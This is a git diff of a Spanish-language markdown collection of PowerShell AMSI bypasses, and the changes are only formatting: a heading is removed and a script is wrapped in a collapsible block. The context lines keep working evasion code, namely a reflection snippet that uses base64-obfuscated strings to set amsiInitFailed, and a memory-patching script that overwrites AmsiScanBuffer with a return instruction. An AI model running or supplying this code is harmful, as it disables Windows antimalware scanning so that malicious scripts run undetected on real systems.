@@ -29,7 +29,6 @@ Estos scripts podrían ser detectados por AMSI en el futuro. Por lo que recomien
 [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
 ```
 
-#Error Forzado
 [Error Forzado](#ferror)
 
 ```powershell
@@ -40,6 +39,9 @@ $field.SetValue($null,$true)
 ```
 
 [Memory Patching](#rastamouse)
+
+<details><summary>Script</summary>
+<p>
 
 ```powershell
 $Win32 = @"
@@ -69,3 +71,5 @@ $Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
 $Patch = [Byte[]] (0xc3, 0x90, 0x90)
 [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 3)  
 ```
+</p>
+</details>
